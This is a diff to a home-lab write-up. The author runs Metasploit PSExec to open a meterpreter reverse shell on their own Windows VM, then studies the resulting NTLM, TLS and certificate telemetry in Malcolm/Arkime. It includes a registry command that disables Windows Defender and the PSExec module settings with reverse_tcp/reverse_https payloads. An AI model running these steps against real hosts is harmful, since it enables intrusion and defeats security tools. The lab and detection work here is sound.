@@ -48,11 +48,8 @@ Use Metasploit's PSExec module to remotely execute a payload on a victim Windows
 
 ### Steps Taken
 
-1. Confirmed victim host (Win11V) IP address (`<REDACTED>` via bridged USB-C Ethernet adapter on Parallels)
-
-![Win11V Bridged IP](images/06-second-shell/win11v-bridged-ip.png)
-
-2. Confirmed attacker host (LinuxA) IP address (`<REDACTED>` on Proxmox)
+1. Confirmed victim host (Win11V) IP address via bridged USB-C Ethernet adapter on Parallels
+2. Confirmed attacker host (LinuxA) IP address on Proxmox
 3. Disabled Windows Defender on Win11V via registry key:
    ```
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
@@ -66,7 +63,7 @@ Use Metasploit's PSExec module to remotely execute a payload on a victim Windows
    ```
    use exploit/windows/smb/psexec
    set sslversion TLS1.2
-   set rhosts <REDACTED>
+   set rhosts <victim IP>
    set smbuser Administrator
    set smbdomain <REDACTED>
    set smbpass <REDACTED>
@@ -76,50 +73,32 @@ Use Metasploit's PSExec module to remotely execute a payload on a victim Windows
    ```
 6. Initial attempts with x64 payloads (`windows/x64/meterpreter/reverse_https`, `windows/x64/meterpreter/reverse_tcp`) failed — service binary would not execute on ARM64 Windows under emulation
 7. Switched to x86 payload `windows/meterpreter/reverse_tcp` on port 4444 — session opened successfully as `NT AUTHORITY\SYSTEM`
-
-![Meterpreter Session - reverse_tcp](images/06-second-shell/meterpreter-session-tcp.png)
-
-![Meterpreter ipconfig output](images/06-second-shell/meterpreter-ipconfig.png)
-
 8. Re-ran with x86 HTTPS payload `windows/meterpreter/reverse_https` on port 443 to generate TLS traffic for Malcolm analysis
-
-![Meterpreter Session - reverse_https](images/06-second-shell/meterpreter-session-https.png)
-
 9. Ran `shell`, `whoami`, and `ipconfig` inside the Meterpreter session to generate traffic
 10. Captured traffic on LinuxA using tcpdump:
     ```bash
-    sudo tcpdump -i enp6s18 host <REDACTED> -w /tmp/psexec_capture.pcap
+    sudo tcpdump -i enp6s18 host <victim IP> -w /tmp/psexec_capture.pcap
     ```
 11. Uploaded PCAP to Malcolm and committed the file
-
-![Malcolm PCAP Upload](images/06-second-shell/malcolm-pcap-upload.png)
-
 12. Analyzed sessions in Arkime
 
 ### Telemetry / Detections
 
 **Malcolm / Arkime — Session Overview**
 
-104 sessions captured between LinuxA and Win11V after PCAP upload:
-
-![Arkime Sessions Overview](images/06-second-shell/arkime-sessions-overview.png)
+104 sessions captured between LinuxA and Win11V after PCAP upload, including tcp, tls, smb, ntlm, ssl, and conn log types across zeek, suricata, and arkime data sources.
 
 **Malcolm / Arkime — NTLM Authentication (from packet capture)**
 
-Arkime query: `ip == <REDACTED> && ip == <REDACTED> && protocols == ntlm`
-
-![NTLM Sessions](images/06-second-shell/ntlm-sessions.png)
+Arkime query: `ip == <attacker IP> && ip == <victim IP> && protocols == ntlm`
 
 Key findings from NTLM session expansion:
 - **User:** Administrator
-- **Originating Host:** LinuxA (`<REDACTED>`)
-- **Responding Host:** Win11V (`<REDACTED>`) port 445
+- **Originating Host:** LinuxA on port 34451
+- **Responding Host:** Win11V on port 445
 - **Action:** Authenticate → **Result:** Success
-- **Related Host:** WORKSTATION, `<REDACTED>`
 - **Protocols:** tcp, gssapi, smb, ntlm
 - **OUI identification:** Source MAC → Proxmox Server Solutions GmbH, Dest MAC → Parallels, Inc.
-
-![NTLM Detail](images/06-second-shell/ntlm-detail.png)
 
 This authentication data was extracted entirely from the packet capture with no host-based logging required.
 
@@ -133,37 +112,23 @@ Expanded TLS session details:
 - **JA4:** `t13i2012h2_2b729b4bf6f3_e24568c0d440`
 - **JA4s:** `t120400_c030_12a20535f9be`
 
-![TLS Session](images/06-second-shell/tls-session.png)
-
 **Certificate Information:**
 - **Issuer/Subject:** Self-signed (Metasploit-generated)
 - **Certificate Thumbprint:** `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45`
 - **Validity:** 2024/09/22 – 2029/09/21
 - **Tags:** cert:self-signed
 
-![Certificate Detail](images/06-second-shell/cert-detail.png)
-
 **Malcolm / Arkime — JA3 Pivot**
 
-Filtered all sessions by JA3 hash to scope investigation beyond a single IP:
-
-Query: `tls.ja3 == 0696c16261fe58808f9fa965be137acd`
-
-![JA3 Pivot](images/06-second-shell/ja3-pivot.png)
+Filtered all sessions by JA3 hash to scope investigation beyond a single IP. In a real-world environment with thousands of hosts, this fingerprint would surface additional compromised systems using the same C2 implant even if only a subset had endpoint logging enabled.
 
 **Malcolm / Arkime — Certificate Thumbprint Pivot**
 
-Filtered by certificate hash to find all sessions using the same Metasploit-generated cert:
-
-Query: `cert.hash == da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45`
-
-![Cert Pivot](images/06-second-shell/cert-pivot.png)
+Filtered by certificate hash to find all sessions using the same Metasploit-generated self-signed certificate. Like JA3, this provides another investigation pivot point independent of IP addresses.
 
 **Malcolm — Connections View with Baseline**
 
-Connections tab showing the two-node graph with 24-hour baseline enabled. Sparkle icons indicate both IPs are new within the baseline period.
-
-![Connections Baseline](images/06-second-shell/connections-baseline.png)
+Connections tab showing the two-node relationship graph with 24-hour baseline enabled. Sparkle icons indicate both hosts are newly communicating within the baseline period — a useful indicator for identifying anomalous network relationships.
 
 **Splunk — Command Line Length Detection (pending license reset)**
 
